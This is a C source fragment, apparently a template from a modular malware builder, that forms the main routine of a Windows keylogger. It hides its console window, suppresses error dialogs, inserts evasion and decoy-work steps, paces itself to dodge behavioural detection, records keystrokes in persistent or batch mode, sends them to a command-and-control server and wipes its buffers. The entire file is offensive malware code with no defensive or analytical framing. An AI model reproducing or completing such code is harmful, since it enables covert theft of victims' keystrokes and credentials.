// chunk: arch/keylogger
// depends: core/emit_buffer, core/run_cmd, collectors/keylogger_poll, exfil/*, evasion/behavioral_pacing
// provides: main
// note: dual-mode keylogger — persistent (default) or batch (--batch flag)

#ifndef CHUNK_ARCH_KEYLOGGER
#define CHUNK_ARCH_KEYLOGGER

int main(int argc, char *argv[]) {
    int batch_mode = 0;
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--batch") == 0) batch_mode = 1;
    }

    FreeConsole();
    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);

{{EVASION_INIT}}
    decoy_work();
    pace(300, 300);

    init_buffer();
    if (!g_data) return 1;

{{KEYLOG_COLLECTOR_CALLS}}

    if (batch_mode) {
        batch_keylog();
        pace(500, 500);
        flush_to_c2();
        if (g_data) { SecureZeroMemory(g_data, g_cap); free(g_data); }
        SecureZeroMemory(g_keylog_buf, sizeof(g_keylog_buf));
        return 0;
    }

    flush_to_c2();
    pace(200, 200);
    persistent_keylog();
    return 0;
}

#endif
